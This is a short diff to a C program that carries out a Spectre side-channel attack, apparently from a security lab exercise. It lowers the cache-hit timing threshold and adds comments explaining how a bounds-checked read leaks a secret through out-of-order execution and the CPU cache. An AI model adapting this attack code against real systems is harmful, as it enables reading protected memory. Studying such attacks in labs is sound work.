@@ -10,13 +10,14 @@ uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
 char    *secret    = "Some Secret Value";   
 uint8_t array[256*4096];
 
-#define CACHE_HIT_THRESHOLD (80)
+#define CACHE_HIT_THRESHOLD (40)
 #define DELTA 1024
 
 // Sandbox Function
 uint8_t restrictedAccess(size_t x)
 {
   if (x <= bound_upper && x >= bound_lower) {
+     // buffer[x] will store in the CPU cache if x is within bounds or out of order execution.
      return buffer[x];
   } else {
      return 0;
@@ -64,7 +65,9 @@ void spectreAttack(size_t index_beyond)
   for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
   for (z = 0; z < 100; z++)  {   }
   // Ask restrictedAccess() to return the secret in out-of-order execution. 
+  // CPU return buffer[index_beyond] in out-of-order execution.
   s = restrictedAccess(index_beyond);  
+  // This cause array[s*4096 + DELTA] to be loaded into the CPU cache
   array[s*4096 + DELTA] += 88;  
 }
 
